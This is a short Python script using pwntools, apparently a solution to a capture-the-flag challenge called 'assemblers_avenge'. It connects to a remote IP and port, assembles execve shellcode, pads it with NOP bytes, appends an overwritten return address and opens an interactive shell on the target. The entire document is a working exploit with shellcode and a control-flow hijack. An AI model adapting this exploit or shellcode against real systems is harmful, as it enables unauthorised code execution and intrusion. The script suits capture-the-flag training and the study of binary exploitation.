#!/usr/bin/python3

from pwn import *
context.binary = exe = ELF('./assemblers_avenge',checksec=False)
context.arch = 'amd64'
#p = process()
#gdb.attach(p,gdbscript='''
#           b*0x000000000040108e
#           ''')
p = remote('94.237.59.180',59036)
shellcode = asm('''
                xor rsi,rsi
                xor rdx,rdx
                mov al,0x3b
                mov edi,0x402065
                syscall
                ''')
print(len(shellcode))
input()
payload = shellcode.ljust(0x10,b'\x90') + p64(0x000000000040106b)
p.send(payload)
p.interactive()
